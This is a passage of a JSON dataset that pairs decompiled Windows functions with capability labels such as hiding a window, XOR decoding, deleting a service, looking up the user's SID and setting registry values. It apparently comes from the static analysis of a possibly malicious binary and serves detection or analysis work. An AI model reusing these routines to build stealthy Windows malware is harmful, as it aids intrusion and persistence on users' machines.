iVar2 = arg_14h;\n                puVar4 = arg_8h;\n                pcVar5 = arg_10h;\n                do {\n                    pcVar5 = pcVar5 + 1;\n                    puVar4 = puVar4 + 1;\n                    iVar2 = iVar2 + -1;\n                    if (iVar2 == 0) break;\n                    bVar6 = *puVar4 == *pcVar5;\n                } while (bVar6);\n                if (bVar6) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        }\n        puVar1 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        bVar6 = arg_8h == NULL;\n        arg_ch = arg_10h;\n        if (&stack0xfffffff0 < puVar1 || bVar6) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    } while( true );\n}\n",
        "token_count": 522
    },
    "00401340": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401340(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00403b80": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403b80(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uchar *unaff_ESI;\n    bool bVar2;\n    unkbyte6 Var3;\n    \n    Var3 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                     (0, 0x4115a0, 0x4235ec, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    uVar1 = Var3;\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((!bVar2) && (bVar2)) {\n        uVar1 = *0x4bb148d3;\n        out(*unaff_ESI, Var3 >> 0x20);\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(uVar1, 0);\n    return 1;\n}\n",
        "token_count": 228
    },
    "00404f50": {
        "rules": [
            "get user security identifier"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404f81) overlaps instruction at (ram,0x00404f7f)\n// \n// WARNING: Removing unreachable block (ram,0x00404f81)\n\nuint __cdecl fcn.00404f50(uint arg_8h)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint32_t unaff_EDI;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x104;\n    if ((0x31b < &stack0xfffffffc) && (SBORROW4(&stack0xfffffffc, 0x31c) != &var_31ch < 0)) {\n        *(unaff_EDI | &stack0xfffffffc) = in_AL;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&var_218h, &var_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &var_218h, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 400
    },
    "00401260": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00401260(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint var_1h;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "004020b0": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004020b0(uint hSCManager, uint lpServiceName)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    uint32_t auStack40 [4];\n    \n    puVar4 = &stack0xfffffffc;\n    auStack40[3] = hSCManager;\n    auStack40[2] = 0x4020e7;\n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (uVar2 != 0) {\n        bVar6 = (uVar2 & (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + '\\x01', uVar2))) == 0;\n        auStack40[1] = 0x402104;\n        auStack40[2] = uVar2;\n        uVar3 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n        if ((!bVar6) && (bVar6)) {\n            puVar5 = &stack0xffffffdc;\n            cVar1 = '\\x10';\n            do {\n                puVar4 = puVar4 + -1;\n                puVar5 = puVar5 + -1;\n                *puVar5 = *puVar4;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n        }\n        auStack40[1] = uVar2;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 365
    },
    "00404b60": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404b60(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x40721c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    }
}